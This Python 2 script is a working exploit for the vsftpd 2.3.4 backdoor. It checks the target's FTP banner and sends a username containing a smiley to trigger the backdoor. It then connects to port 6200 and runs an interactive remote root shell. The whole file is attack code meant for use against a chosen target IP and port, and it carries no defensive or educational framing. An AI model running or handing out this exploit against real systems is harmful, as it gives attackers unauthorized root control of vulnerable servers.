# -*- coding:utf-8 -*-

from socket import *
from time import sleep
import sys
from threading import Thread

if len(sys.argv) != 3:
    print './vsftpd(2-3-4).py [TARGET_IP] [TARGET_PORT]'
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

def exploit(t, p):
    """Exploit function : triggers vuln"""
    assert type(t)==str and type(p)==int

    #FTP socket
    sock = socket(AF_INET, SOCK_STREAM)
    try:
        sock.connect((t, p))

    except Exception:
        print 'Failed to reach target'
        sys.exit(1)

    #Check service
    banner = sock.recv(1024)
    if 'vsFTPd 2.3.4' in banner:
        #Trigger vulnerability
        sock.send("USER a:)\n")
        sock.send("PASS a\n")
        sock.close()

    else:
        print "Nope, invalid version or service!"
        sys.exit(1)

    print "Exploit triggered!"

def shellOut(sock, status):
    """Function to display on stdout socket input (shell output)"""
    sock.settimeout(3)

    while status==True:
        try:
            print sock.recv(1024)
        except timeout:
            pass
        except Exception:
            return

        sleep(0.3)

def shellIn(sock, status):
    """Function to send commands to shell (shell input)"""

    while status==True:
        try:
            command = raw_input().strip()
            if command == "exit":
                shell_status = False
                sock.close()
                break

            sock.send(command+'\n')

        except Exception:
            status=False
            return
        
        sleep(0.3)

def handle(t):
    """Handle and keep shell connexion"""
    #Shell socket
    sock = socket(AF_INET, SOCK_STREAM)
    shell_status = True

    try:
        #Exploit opens port 6200
        sock.connect((t, 6200))

    except Exception:
        print "Failed to reach shell"
        sys.exit(1)

    recv_thread = Thread(target=shellOut, args=(sock, shell_status))
    recv_thread.start()

    send_thread = Thread(target=shellIn, args=(sock, shell_status))
    send_thread.start()

    print "Accessed root shell"
    #On attend que l'util. quitte
    recv_thread.join()

exploit(target, port)
sleep(3)
handle(target)
